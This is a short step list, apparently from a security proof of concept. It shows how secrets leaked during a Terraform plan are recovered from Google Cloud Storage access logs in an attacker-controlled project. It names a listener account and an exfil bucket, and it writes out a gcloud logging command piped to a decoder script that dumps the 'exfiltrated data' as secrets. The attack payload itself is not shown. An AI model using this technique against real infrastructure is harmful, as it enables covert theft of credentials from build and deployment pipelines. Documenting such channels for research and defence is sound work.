# Steps

1. Enable [Data Access audit logs](https://cloud.google.com/logging/docs/audit/configure-data-access) for Google Cloud Storage Data Read type logs on your listener account.
2. Run Terraform Plan.
3. Dump the exfiltrated data with the following command:
```
gcloud logging --project <attacker project name> read 'protoPayload.methodName="storage.objects.get" AND resource.labels.bucket_name="<exfil bucket name>"' --limit=100 --format="value(protoPayload.resourceName)" \
  | cut -d'/' -f 6 > dumpaccesslogs.txt \
  && python3 decoder.py dumpaccesslogs.txt secrets
```
